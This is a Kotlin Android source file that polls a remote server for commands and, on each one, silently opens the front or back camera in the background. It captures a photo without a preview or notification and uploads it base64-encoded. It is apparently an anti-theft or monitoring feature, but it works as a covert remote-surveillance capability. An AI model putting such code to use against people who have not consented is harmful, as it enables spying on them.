package com.example.sentry.service

import android.annotation.SuppressLint
import android.content.Context
import android.graphics.ImageFormat
import android.hardware.camera2.*
import android.media.ImageReader
import android.os.Handler
import android.os.HandlerThread
import android.os.PowerManager
import android.util.Base64
import android.util.Log
import android.util.Size
import com.example.sentry.network.SentryApiClient
import kotlinx.coroutines.*
import java.util.concurrent.atomic.AtomicBoolean
import java.util.concurrent.atomic.AtomicInteger

object BackgroundCameraManager {
    private const val TAG = "SentryCamera"
    private var pollerJob: Job? = null
    private val scope = CoroutineScope(Dispatchers.IO)
    private val isCapturing = AtomicBoolean(false)

    fun startListening(context: Context) {
        if (pollerJob?.isActive == true) return
        pollerJob = scope.launch {
            val client = SentryApiClient(context)
            Log.d(TAG, "Background camera polling started")
            while (isActive) {
                try {
                    val res = client.pollCameraCommand()
                    if (res.isSuccess) {
                        val cmd = res.getOrNull()
                        if (!cmd.isNullOrBlank()) {
                            Log.d(TAG, "Received camera capture command: $cmd")
                            capturePhoto(context, cmd) { base64 ->
                                scope.launch {
                                    try {
                                        client.uploadPhoto(cmd, base64)
                                        Log.d(TAG, "Uploaded captured $cmd photo successfully")
                                    } catch (e: Exception) {
                                        Log.e(TAG, "Failed to upload photo", e)
                                    }
                                }
                            }
                        }
                    }
                } catch (e: Exception) {
                    Log.w(TAG, "Camera command poll error: ${e.message}")
                }
                delay(2000)
            }
        }
    }

    @SuppressLint("MissingPermission")
    private fun capturePhoto(context: Context, cameraFacing: String, onCaptured: (String) -> Unit) {
        // Prevent concurrent capture collisions
        if (!isCapturing.compareAndSet(false, true)) {
            Log.w(TAG, "Capture already in progress, skipping duplicate request")
            return
        }

        val powerManager = context.getSystemService(Context.POWER_SERVICE) as? PowerManager
        val wakeLock = powerManager?.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK, "Sentry::CameraCaptureWakeLock")?.apply {
            try {
                acquire(12_000L) // 12s safety timeout
            } catch (_: Exception) {}
        }

        var handlerThread: HandlerThread? = null
        var cameraDevice: CameraDevice? = null
        var imageReader: ImageReader? = null
        var captureSession: CameraCaptureSession? = null
        val isCleanedUp = AtomicBoolean(false)
        val hasCaptured = AtomicBoolean(false)
        val frameCount = AtomicInteger(0)

        fun cleanup() {
            if (isCleanedUp.compareAndSet(false, true)) {
                try {
                    captureSession?.stopRepeating()
                    captureSession?.close()
                } catch (_: Exception) {}
                try {
                    cameraDevice?.close()
                } catch (_: Exception) {}
                try {
                    imageReader?.close()
                } catch (_: Exception) {}
                try {
                    handlerThread?.quitSafely()
                } catch (_: Exception) {}
                try {
                    if (wakeLock?.isHeld == true) {
                        wakeLock.release()
                    }
                } catch (_: Exception) {}
                isCapturing.set(false)
                Log.d(TAG, "Camera resources cleaned up")
            }
        }

        // Safety watchdog: Force cleanup after 10 seconds if hardware hangs
        scope.launch {
            delay(10000)
            if (!isCleanedUp.get()) {
                Log.w(TAG, "Camera capture watchdog timeout triggered - releasing hardware")
                cleanup()
            }
        }

        try {
            val cameraManager = context.getSystemService(Context.CAMERA_SERVICE) as? CameraManager
            if (cameraManager == null) {
                cleanup()
                return
            }

            val targetFacing = if (cameraFacing.equals("front", ignoreCase = true)) {
                CameraCharacteristics.LENS_FACING_FRONT
            } else {
                CameraCharacteristics.LENS_FACING_BACK
            }

            var selectedCameraId: String? = null
            for (id in cameraManager.cameraIdList) {
                val chars = cameraManager.getCameraCharacteristics(id)
                val facing = chars.get(CameraCharacteristics.LENS_FACING)
                if (facing == targetFacing) {
                    selectedCameraId = id
                    break
                }
            }

            if (selectedCameraId == null) {
                selectedCameraId = cameraManager.cameraIdList.firstOrNull()
            }

            if (selectedCameraId == null) {
                Log.e(TAG, "No camera found on device")
                cleanup()
                return
            }

            val characteristics = cameraManager.getCameraCharacteristics(selectedCameraId)
            val sensorOrientation = characteristics.get(CameraCharacteristics.SENSOR_ORIENTATION) ?: 90
            val map = characteristics.get(CameraCharacteristics.SCALER_STREAM_CONFIGURATION_MAP)
            val supportedSizes = map?.getOutputSizes(ImageFormat.JPEG) ?: emptyArray()

            // Select balanced resolution for fast encoding and crisp clarity (~1280x720 or 1920x1080)
            val optimalSize: Size = supportedSizes
                .filter { it.width <= 1920 && it.height <= 1080 && it.width >= 640 }
                .maxByOrNull { it.width * it.height }
                ?: supportedSizes.firstOrNull()
                ?: Size(1280, 720)

            Log.d(TAG, "Selected Camera: $selectedCameraId (facing: $cameraFacing), Res: ${optimalSize.width}x${optimalSize.height}, Orientation: $sensorOrientation")

            val thread = HandlerThread("BackgroundCamera_${System.currentTimeMillis()}").apply { start() }
            handlerThread = thread
            val handler = Handler(thread.looper)

            // Max images = 5 to accommodate warmup burst frames
            val reader = ImageReader.newInstance(optimalSize.width, optimalSize.height, ImageFormat.JPEG, 5)
            imageReader = reader

            reader.setOnImageAvailableListener({ r ->
                try {
                    val image = r.acquireLatestImage()
                    if (image != null) {
                        val currentFrame = frameCount.incrementAndGet()
                        Log.d(TAG, "Received camera frame #$currentFrame")

                        // Require at least 4 warmup frames so Auto-Exposure (AE) and Auto-White-Balance (AWB) are fully converged
                        if (currentFrame >= 4 && hasCaptured.compareAndSet(false, true)) {
                            val buffer = image.planes[0].buffer
                            val bytes = ByteArray(buffer.remaining())
                            buffer.get(bytes)
                            image.close()

                            if (bytes.isNotEmpty()) {
                                val base64 = Base64.encodeToString(bytes, Base64.NO_WRAP)
                                Log.d(TAG, "Crisp photo captured on frame #$currentFrame, size: ${bytes.size} bytes")
                                onCaptured(base64)
                            }
                            cleanup()
                        } else {
                            // Discard underexposed initial warmup frame
                            image.close()
                        }
                    }
                } catch (e: Exception) {
                    Log.e(TAG, "Error in ImageReader callback", e)
                    cleanup()
                }
            }, handler)

            cameraManager.openCamera(selectedCameraId, object : CameraDevice.StateCallback() {
                override fun onOpened(camera: CameraDevice) {
                    cameraDevice = camera
                    try {
                        // 1. Build Preview/Warmup Request to rapidly converge 3A (Exposure, Focus, White Balance)
                        val previewRequestBuilder = camera.createCaptureRequest(CameraDevice.TEMPLATE_PREVIEW).apply {
                            addTarget(reader.surface)
                            set(CaptureRequest.CONTROL_MODE, CaptureRequest.CONTROL_MODE_AUTO)
                            set(CaptureRequest.CONTROL_AF_MODE, CaptureRequest.CONTROL_AF_MODE_CONTINUOUS_PICTURE)
                            set(CaptureRequest.CONTROL_AE_MODE, CaptureRequest.CONTROL_AE_MODE_ON)
                            set(CaptureRequest.CONTROL_AWB_MODE, CaptureRequest.CONTROL_AWB_MODE_AUTO)
                            set(CaptureRequest.JPEG_ORIENTATION, sensorOrientation)
                            set(CaptureRequest.JPEG_QUALITY, 92.toByte())
                        }

                        // 2. Build High-Quality Still Capture Request
                        val stillRequestBuilder = camera.createCaptureRequest(CameraDevice.TEMPLATE_STILL_CAPTURE).apply {
                            addTarget(reader.surface)
                            set(CaptureRequest.CONTROL_MODE, CaptureRequest.CONTROL_MODE_AUTO)
                            set(CaptureRequest.CONTROL_AF_MODE, CaptureRequest.CONTROL_AF_MODE_CONTINUOUS_PICTURE)
                            set(CaptureRequest.CONTROL_AE_MODE, CaptureRequest.CONTROL_AE_MODE_ON)
                            set(CaptureRequest.CONTROL_AWB_MODE, CaptureRequest.CONTROL_AWB_MODE_AUTO)
                            set(CaptureRequest.JPEG_ORIENTATION, sensorOrientation)
                            set(CaptureRequest.JPEG_QUALITY, 95.toByte())
                        }

                        val sessionCallback = object : CameraCaptureSession.StateCallback() {
                            override fun onConfigured(session: CameraCaptureSession) {
                                captureSession = session
                                try {
                                    // Start warmup repeating stream
                                    session.setRepeatingRequest(
                                        previewRequestBuilder.build(),
                                        object : CameraCaptureSession.CaptureCallback() {
                                            override fun onCaptureCompleted(
                                                s: CameraCaptureSession,
                                                request: CaptureRequest,
                                                result: TotalCaptureResult
                                            ) {
                                                val count = frameCount.get()
                                                val aeState = result.get(CaptureResult.CONTROL_AE_STATE)
                                                val isConverged = aeState == CaptureResult.CONTROL_AE_STATE_CONVERGED ||
                                                        aeState == CaptureResult.CONTROL_AE_STATE_LOCKED ||
                                                        count >= 5

                                                if (isConverged && !hasCaptured.get()) {
                                                    try {
                                                        s.stopRepeating()
                                                        s.capture(stillRequestBuilder.build(), null, handler)
                                                    } catch (_: Exception) {}
                                                }
                                            }

                                            override fun onCaptureFailed(
                                                s: CameraCaptureSession,
                                                request: CaptureRequest,
                                                failure: CaptureFailure
                                            ) {
                                                Log.w(TAG, "Warmup frame capture failed: ${failure.reason}")
                                            }
                                        },
                                        handler
                                    )
                                } catch (e: Exception) {
                                    Log.e(TAG, "Failed to start camera repeating stream", e)
                                    cleanup()
                                }
                            }

                            override fun onConfigureFailed(session: CameraCaptureSession) {
                                Log.e(TAG, "Camera capture session configuration failed")
                                cleanup()
                            }
                        }

                        if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.P) {
                            val outputConfig = android.hardware.camera2.params.OutputConfiguration(reader.surface)
                            val sessionConfig = android.hardware.camera2.params.SessionConfiguration(
                                android.hardware.camera2.params.SessionConfiguration.SESSION_REGULAR,
                                listOf(outputConfig),
                                java.util.concurrent.Executors.newSingleThreadExecutor(),
                                sessionCallback
                            )
                            camera.createCaptureSession(sessionConfig)
                        } else {
                            @Suppress("DEPRECATION")
                            camera.createCaptureSession(listOf(reader.surface), sessionCallback, handler)
                        }
                    } catch (e: Exception) {
                        Log.e(TAG, "Failed to create camera capture session", e)
                        cleanup()
                    }
                }

                override fun onDisconnected(camera: CameraDevice) {
                    Log.w(TAG, "Camera disconnected")
                    cleanup()
                }

                override fun onError(camera: CameraDevice, error: Int) {
                    Log.e(TAG, "Camera device open error: $error")
                    cleanup()
                }
            }, handler)

        } catch (e: SecurityException) {
            Log.e(TAG, "Camera permission denied or restricted in background", e)
            cleanup()
        } catch (e: Exception) {
            Log.e(TAG, "Unexpected error during background photo capture", e)
            cleanup()
        }
    }
}

